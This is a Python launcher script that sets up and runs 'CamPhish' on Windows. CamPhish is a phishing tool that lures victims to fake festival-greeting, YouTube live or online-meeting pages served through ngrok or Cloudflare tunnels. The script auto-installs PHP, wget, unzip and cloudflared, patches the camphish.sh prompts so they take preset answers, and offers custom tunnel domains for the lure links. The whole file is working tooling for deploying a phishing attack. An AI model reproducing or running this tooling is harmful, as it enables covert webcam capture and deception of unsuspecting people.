import subprocess
import sys
import os
import urllib.request
import zipfile
import shutil

# ── Config ────────────────────────────────────────────────────────────────────
PHP_VERSION  = "8.3.22"
PHP_ZIP_URL  = f"https://windows.php.net/downloads/releases/php-{PHP_VERSION}-nts-Win32-vs16-x64.zip"
PHP_DIR_NAME = "php"

# Git Bash ships wget, unzip, curl — we look in all known locations
GIT_TOOL_DIRS = [
    # Standard Git for Windows installer
    r"C:\Program Files\Git\usr\bin",
    r"C:\Program Files\Git\bin",
    r"C:\Program Files (x86)\Git\usr\bin",
    r"C:\Program Files (x86)\Git\bin",
    # Chocolatey git package
    r"C:\ProgramData\chocolatey\lib\git\tools\usr\bin",
    r"C:\ProgramData\chocolatey\lib\git\tools\bin",
    r"C:\ProgramData\chocolatey\bin",
    # MSYS2
    r"C:\msys64\usr\bin",
    r"C:\msys32\usr\bin",
]

BASH_CANDIDATES = [
    r"C:\Program Files\Git\bin\bash.exe",
    r"C:\Program Files (x86)\Git\bin\bash.exe",
    r"C:\ProgramData\chocolatey\lib\git\tools\bin\bash.exe",
    r"C:\msys64\usr\bin\bash.exe",
    r"C:\msys32\usr\bin\bash.exe",
    r"C:\Windows\System32\bash.exe",   # WSL bash
]

# ── Helpers ───────────────────────────────────────────────────────────────────

def run_silent(cmd, **kwargs):
    return subprocess.run(cmd, capture_output=True, **kwargs)

def is_cmd_available(cmd):
    """Check if a command exists on PATH without running it."""
    return shutil.which(cmd) is not None

def prepend_path(directory):
    os.environ["PATH"] = directory + os.pathsep + os.environ.get("PATH", "")

def to_bash_path(win_path):
    """Convert a Windows path (C:\\foo\\bar) to Git Bash Unix format (/c/foo/bar)."""
    p = os.path.abspath(win_path).replace("\\", "/")
    if len(p) >= 2 and p[1] == ":":
        p = "/" + p[0].lower() + p[2:]
    return p

def refresh_path_from_registry():
    """
    Read the current system + user PATH from the Windows registry
    so that tools installed after this process started are visible.
    """
    try:
        import winreg
        paths = []
        keys = [
            (winreg.HKEY_LOCAL_MACHINE,
             r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
             "Path"),
            (winreg.HKEY_CURRENT_USER,
             r"Environment",
             "Path"),
        ]
        for hive, subkey, value in keys:
            try:
                with winreg.OpenKey(hive, subkey) as key:
                    data, _ = winreg.QueryValueEx(key, value)
                    paths.append(data)
            except FileNotFoundError:
                pass
        if paths:
            combined = os.pathsep.join(paths)
            os.environ["PATH"] = combined + os.pathsep + os.environ.get("PATH", "")
    except Exception:
        pass  # non-Windows or registry error — silently skip

# ── Find camphish.sh ──────────────────────────────────────────────────────────

def find_script(base_dir):
    candidates = [
        os.path.join(base_dir, "camphish.sh"),
        os.path.join(os.path.dirname(base_dir), "camphish.sh"),
        os.path.join(os.getcwd(), "camphish.sh"),
    ]
    for p in candidates:
        if os.path.isfile(p):
            return os.path.abspath(p)
    return None

# ── Ensure Git Bash tools (wget, unzip, curl) ────────────────────────────────

# wget standalone download (GNU wget for Windows)
WGET_URL        = "https://eternallybored.org/misc/wget/releases/wget-1.21.4-win64.zip"
# unzip standalone download (Info-ZIP for Windows)
UNZIP_URL       = "https://downloads.sourceforge.net/project/gnuwin32/unzip/5.51-1/unzip-5.51-1-bin.zip"
WGET_EXE_IN_ZIP = "wget.exe"

def _download_exe_from_zip(url, exe_name, dest_dir, label):
    """Generic: download a zip from url, extract exe_name into dest_dir."""
    zip_path = os.path.join(dest_dir, f"_{label}_tmp.zip")
    print(f"[*] {label} not found. Downloading {label} automatically...")

    def _progress(b, bs, total):
        if total > 0:
            print(f"\r    {min(b * bs * 100 // total, 100)}%", end="", flush=True)

    try:
        urllib.request.urlretrieve(url, zip_path, reporthook=_progress)
        print("\r    Done.        ")
        with zipfile.ZipFile(zip_path, "r") as zf:
            for member in zf.namelist():
                if member.lower().endswith(exe_name.lower()):
                    data = zf.read(member)
                    dest = os.path.join(dest_dir, exe_name)
                    with open(dest, "wb") as f:
                        f.write(data)
                    print(f"[+] {label} installed to: {dest}")
                    return dest
        print(f"[-] Could not find {exe_name} inside the downloaded zip.")
    except Exception as e:
        print(f"[-] {label} auto-download failed: {e}")
    finally:
        if os.path.isfile(zip_path):
            os.remove(zip_path)
    return None

def ensure_git_tools(base_dir):
    """
    Make sure wget, unzip, and curl are on PATH.
    Priority:
      1. Already on PATH → nothing to do.
      2. Found in Git Bash / MSYS2 dirs → prepend to PATH.
      3. wget or unzip missing → auto-download standalone exe.
    """
    # Refresh PATH from registry (picks up newly installed Git)
    refresh_path_from_registry()

    # Prepend all known Git / MSYS2 bin dirs
    for d in GIT_TOOL_DIRS:
        if os.path.isdir(d):
            prepend_path(d)

    still_missing = [t for t in ("wget", "unzip", "curl") if not is_cmd_available(t)]
    if not still_missing:
        return

    # Auto-fix wget by downloading standalone exe
    if "wget" in still_missing:
        dest = _download_exe_from_zip(WGET_URL, "wget.exe", base_dir, "wget")
        if dest:
            prepend_path(os.path.dirname(dest))
            still_missing = [t for t in still_missing if not is_cmd_available(t)]

    # Auto-fix unzip by downloading standalone exe
    if "unzip" in still_missing:
        dest = _download_exe_from_zip(UNZIP_URL, "unzip.exe", base_dir, "unzip")
        if dest:
            prepend_path(os.path.dirname(dest))
            still_missing = [t for t in still_missing if not is_cmd_available(t)]

    if not still_missing:
        return

    # Any remaining tools we can't auto-fix — show instructions
    print()
    print("━" * 62)
    print("  MISSING TOOLS: " + ", ".join(still_missing).upper())
    print("━" * 62)
    print()
    print("  These tools are needed by CamPhish.")
    print("  The easiest way to get them is installing Git for Windows:")
    print()
    print("    1. Go to: https://git-scm.com/download/win")
    print("    2. Download and run the installer")
    print("    3. Keep all default settings and click Next/Install")
    print("    4. Restart this program")
    print()
    print("  Or via PowerShell (run as Administrator):")
    print("    winget install --id Git.Git -e")
    print()
    print("━" * 62)
    input("\nPress Enter to exit...")
    sys.exit(1)

# ── Ensure Cloudflared ────────────────────────────────────────────────────────

CLOUDFLARED_URL = ("https://github.com/cloudflare/cloudflared/releases/latest/"
                   "download/cloudflared-windows-amd64.exe")

def ensure_cloudflared(script_dir):
    """
    Download cloudflared.exe into script_dir if not already there.
    Python's urllib follows redirects (wget sometimes doesn't on GitHub URLs).
    """
    dest = os.path.join(script_dir, "cloudflared.exe")
    if os.path.isfile(dest) and os.path.getsize(dest) > 1_000_000:
        print("[+] cloudflared.exe: already present.")
        return dest

    print("[*] Downloading cloudflared.exe...")

    def _progress(b, bs, total):
        if total > 0:
            print(f"\r    {min(b * bs * 100 // total, 100)}%", end="", flush=True)

    try:
        req = urllib.request.Request(
            CLOUDFLARED_URL,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        with urllib.request.urlopen(req, timeout=60) as resp, \
             open(dest, "wb") as f:
            total = int(resp.headers.get("Content-Length", 0))
            downloaded = 0
            chunk = 65536
            while True:
                data = resp.read(chunk)
                if not data:
                    break
                f.write(data)
                downloaded += len(data)
                if total:
                    pct = min(downloaded * 100 // total, 100)
                    print(f"\r    {pct}%", end="", flush=True)
        print("\r    Done.        ")
        print(f"[+] cloudflared.exe downloaded ({os.path.getsize(dest)//1024} KB)")
        return dest
    except Exception as e:
        print(f"[-] cloudflared download failed: {e}")
        if os.path.isfile(dest):
            os.remove(dest)
        return None

# ── Ensure PHP ────────────────────────────────────────────────────────────────

def _get_latest_php_url():
    """Scrape windows.php.net/download/ to find the latest NTS x64 zip URL."""
    import re as _re
    try:
        print("[*] Looking up latest PHP version...")
        req = urllib.request.Request(
            "https://windows.php.net/download/",
            headers={"User-Agent": "Mozilla/5.0"}
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            html = resp.read().decode("utf-8", errors="replace")
        # Find all NTS x64 zip hrefs
        matches = _re.findall(
            r'href="(/downloads/releases/php-[\d.]+-nts-Win32-[^"]*x64\.zip)"',
            html
        )
        if matches:
            url = "https://windows.php.net" + matches[0]
            print(f"[+] Found PHP download: {url.split('/')[-1]}")
            return url
    except Exception as e:
        print(f"[!] Could not fetch PHP download page: {e}")
    return None

def ensure_php(base_dir):
    if is_cmd_available("php"):
        return

    bundled = os.path.join(base_dir, PHP_DIR_NAME, "php.exe")
    if os.path.isfile(bundled):
        prepend_path(os.path.dirname(bundled))
        print("[+] PHP: using bundled copy.")
        return

    # ── Try winget first (cleanest install) ──────────────────────────
    print("[*] PHP not found. Trying winget install...")
    try:
        result = subprocess.run(
            ["winget", "install", "PHP.PHP", "--silent",
             "--accept-package-agreements", "--accept-source-agreements"],
            timeout=120, capture_output=True
        )
        refresh_path_from_registry()
        if is_cmd_available("php"):
            print("[+] PHP installed via winget.")
            return
    except Exception:
        pass

    # ── Try Chocolatey ───────────────────────────────────────────────
    if shutil.which("choco"):
        print("[*] Trying choco install php...")
        try:
            subprocess.run(["choco", "install", "php", "-y"],
                           timeout=120, capture_output=True)
            refresh_path_from_registry()
            if is_cmd_available("php"):
                print("[+] PHP installed via Chocolatey.")
                return
        except Exception:
            pass

    # ── Direct download from php.net ─────────────────────────────────
    php_url = _get_latest_php_url()
    if not php_url:
        # Hardcoded fallback candidates (newest first)
        for ver in ("8.3.21", "8.3.20", "8.3.19", "8.3.15"):
            candidate = (f"https://windows.php.net/downloads/releases/"
                         f"php-{ver}-nts-Win32-vs16-x64.zip")
            php_url = candidate
            break

    php_dir  = os.path.join(base_dir, PHP_DIR_NAME)
    zip_path = os.path.join(base_dir, "_php_tmp.zip")

    def _progress(b, bs, total):
        if total > 0:
            print(f"\r    {min(b * bs * 100 // total, 100)}%", end="", flush=True)

    print(f"[*] Downloading PHP...")
    try:
        urllib.request.urlretrieve(php_url, zip_path, reporthook=_progress)
        print("\r    Done.        ")
        os.makedirs(php_dir, exist_ok=True)
        with zipfile.ZipFile(zip_path, "r") as zf:
            zf.extractall(php_dir)
    except Exception as e:
        print(f"[-] PHP auto-download failed: {e}")
        print()
        print("━" * 62)
        print("  HOW TO INSTALL PHP MANUALLY")
        print("━" * 62)
        print()
        print("  Option 1 — Install via winget (easiest):")
        print("    Open PowerShell as Administrator and run:")
        print("      winget install PHP.PHP")
        print()
        print("  Option 2 — Install via Chocolatey:")
        print("      choco install php")
        print()
        print("  Option 3 — Download from php.net:")
        print("    1. Open: https://windows.php.net/download/")
        print("    2. Download 'VS16 x64 Non Thread Safe' ZIP")
        print("    3. Extract to C:\\php and add to PATH")
        print()
        print("  After installing PHP, re-run this program.")
        print("━" * 62)
        input("\nPress Enter to exit...")
        sys.exit(1)
    finally:
        if os.path.isfile(zip_path):
            os.remove(zip_path)

    prepend_path(php_dir)
    if is_cmd_available("php"):
        print("[+] PHP installed successfully.")
    else:
        print("[-] PHP install failed.")
        sys.exit(1)

# ── Ensure Bash ───────────────────────────────────────────────────────────────

def find_bash_exe():
    for p in BASH_CANDIDATES:
        if os.path.isfile(p):
            return p
    return None

def install_git_via_winget():
    print("[*] Attempting to install Git (bash) via winget...")
    try:
        result = subprocess.run(
            ["winget", "install", "--id", "Git.Git", "-e", "--silent",
             "--accept-package-agreements", "--accept-source-agreements"],
            timeout=300,
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired) as e:
        print(f"    winget failed: {e}")
    return False

def ensure_bash():
    if is_cmd_available("bash"):
        return "bash"

    bash_exe = find_bash_exe()
    if bash_exe:
        print(f"[+] Bash found at: {bash_exe}")
        return bash_exe

    if install_git_via_winget():
        new_git_bash = r"C:\Program Files\Git\bin\bash.exe"
        if os.path.isfile(new_git_bash):
            print("[+] Git installed. Using bash.")
            return new_git_bash

    print("[-] Could not find or install bash automatically.")
    print("    Please install Git for Windows from: https://git-scm.com/download/win")
    input("\nPress Enter to exit...")
    sys.exit(1)

# ── Instructions ─────────────────────────────────────────────────────────────

def print_banner():
    line = "-" * 62
    print()
    print(line)
    print("  CAMPHISH -- SETUP")
    print(line)
    print()

def collect_user_choices():
    """Collect all menu choices in Python before launching bash."""
    line = "-" * 62
    choices = {}

    # --- Tunnel section ---
    print()
    print("  --- Tunnel Server ---")
    print("  [1] Ngrok        (requires free ngrok.com account)")
    print("  [2] CloudFlare   (no account needed - recommended)")
    while True:
        v = input("\n[+] Choose tunnel [1/2, default 2]: ").strip() or "2"
        if v in ("1", "2"):
            choices["CP_TUNNEL"] = v
            break
        print("    Invalid — enter 1 or 2.")

    # --- Template section ---
    print()
    print("  --- Template ---")
    print("  [1] Festival Wishing")
    print("  [2] Live YouTube TV")
    print("  [3] Online Meeting")
    while True:
        v = input("\n[+] Choose template [1/2/3, default 1]: ").strip() or "1"
        if v in ("1", "2", "3"):
            choices["CP_TEMPLATE"] = v
            break
        print("    Invalid — enter 1, 2 or 3.")

    if choices["CP_TEMPLATE"] == "1":
        fest = input("[+] Enter festival name (e.g. Eid, Diwali, Christmas): ").strip()
        choices["CP_FEST_NAME"] = fest.replace(" ", "") or "Festival"

    if choices["CP_TEMPLATE"] == "2":
        yt = input("[+] Enter YouTube video watch ID (part after ?v=): ").strip()
        choices["CP_YT_ID"] = yt or "dQw4w9WgXcQ"

    # --- Ngrok auth token ---
    if choices["CP_TUNNEL"] == "1":
        print()
        print("  Get your free authtoken at: https://dashboard.ngrok.com/authtokens")
        choices["CP_NGROK_TOKEN"] = input("[+] Enter ngrok authtoken: ").strip()

    # --- CloudFlare domain option ---
    if choices["CP_TUNNEL"] == "2":
        print()
        print("  --- CloudFlare Domain ---")
        print("  [1] Random URL    (no setup, e.g. abc123.trycloudflare.com)")
        print("  [2] Custom Domain (FREE -- your own domain via Cloudflare)")
        while True:
            v = input("\n[+] Choose domain option [1/2, default 1]: ").strip() or "1"
            if v in ("1", "2"):
                choices["CP_CF_DOMAIN_OPT"] = v
                break
            print("    Invalid — enter 1 or 2.")

        if choices["CP_CF_DOMAIN_OPT"] == "2":
            dom = input("[+] Enter your custom domain (e.g. cam.yourdomain.com): ").strip()
            choices["CP_CUSTOM_DOMAIN"] = dom

    print()
    print(line)
    print("  All set! Launching CamPhish...")
    print(line)
    print()
    return choices

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(sys.executable)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))

    # Show banner and collect all choices from user in Python
    print_banner()
    choices = collect_user_choices()

    # --- Find camphish.sh ---
    script_path = find_script(base_dir)
    if not script_path:
        print("[-] camphish.sh not found. Please place it in the same folder as this exe.")
        input("\nPress Enter to exit...")
        sys.exit(1)
    script_dir = os.path.dirname(script_path)
    print(f"[+] Script  : {script_path}")

    # --- PHP ---
    ensure_php(base_dir)

    # --- wget / unzip / curl (from Git Bash, or auto-downloaded) ---
    ensure_git_tools(base_dir)

    # --- Cloudflared (pre-download so wget redirect issues don't block it) ---
    ensure_cloudflared(script_dir)

    # --- Bash ---
    bash_cmd = ensure_bash()
    print(f"[+] Bash    : {bash_cmd}")
    print()

    # --- Kill stale tunnel processes from previous runs ---
    for stale in ("cloudflared.exe", "ngrok.exe", "php.exe"):
        try:
            subprocess.run(
                ["taskkill", "/F", "/IM", stale],
                capture_output=True
            )
        except Exception:
            pass

    # --- Patch camphish.sh for Windows + auto-answer compatibility ---
    patched_path = os.path.join(script_dir, "_camphish_patched.sh")
    try:
        with open(script_path, "r", errors="replace") as f:
            content = f.read()

        # Fix 1: Modern cloudflared uses --url not -url
        content = content.replace(
            "tunnel -url 127.0.0.1:3333",
            "tunnel --url 127.0.0.1:3333"
        )
        # Fix 2: Give cloudflared 20 seconds instead of 10 to establish tunnel
        content = content.replace("sleep 10\nlink=$(grep", "sleep 20\nlink=$(grep")

        # Fix 3: Replace all bash read prompts with env-var reads so no
        #         interactive input is needed inside the bash session.
        replacements = [
            # Tunnel choice
            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Choose a Port Forwarding option: [Default is 1] \\e[0m' option_server",
             "option_server=\"${CP_TUNNEL:-2}\""),
            # Template choice
            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Choose a template: [Default is 1] \\e[0m' option_tem",
             "option_tem=\"${CP_TEMPLATE:-1}\""),
            # Festival name
            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Enter festival name: \\e[0m' fest_name",
             "fest_name=\"${CP_FEST_NAME:-Festival}\""),
            # YouTube ID
            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Enter YouTube video watch ID: \\e[0m' yt_video_ID",
             "yt_video_ID=\"${CP_YT_ID:-dQw4w9WgXcQ}\""),
            # CloudFlare domain option
            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Choose domain option: [Default is 1] \\e[0m' cf_domain_option",
             "cf_domain_option=\"${CP_CF_DOMAIN_OPT:-1}\""),
            # Custom domain
            ("read -p $'\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Enter your custom domain (e.g. cam.yourdomain.com): \\e[0m' cf_custom_domain",
             "cf_custom_domain=\"${CP_CUSTOM_DOMAIN:-}\""),
            # Ngrok authtoken (Windows path)
            ("read -p $'\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Enter your valid ngrok authtoken: \\e[0m' ngrok_auth",
             "ngrok_auth=\"${CP_NGROK_TOKEN:-}\""),
        ]
        for old, new in replacements:
            if old in content:
                content = content.replace(old, new)

        with open(patched_path, "w", newline="\n") as f:
            f.write(content)

        run_script = patched_path
        print("[+] Script patched for Windows + auto-answer.")
    except Exception as e:
        print(f"[!] Could not patch script ({e}), using original.")
        run_script = script_path

    # --- Build env with user choices injected ---
    env = os.environ.copy()
    for key, val in choices.items():
        env[key] = str(val)

    # --- Run ---
    bash_extra_dirs = [base_dir, script_dir]
    bash_path_prefix = ":".join(to_bash_path(d) for d in bash_extra_dirs if os.path.isdir(d))
    bash_script = to_bash_path(run_script)

    try:
        bash_inline = f'export PATH="{bash_path_prefix}:$PATH"; bash "{bash_script}"'
        subprocess.run([bash_cmd, "-c", bash_inline], cwd=script_dir, env=env)
        input("\nScript finished. Press Enter to exit...")
    except FileNotFoundError as e:
        print(f"\n[-] Could not launch bash: {e}")
        input("\nPress Enter to exit...")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        input("\nPress Enter to exit...")
        sys.exit(1)

if __name__ == "__main__":
    main()
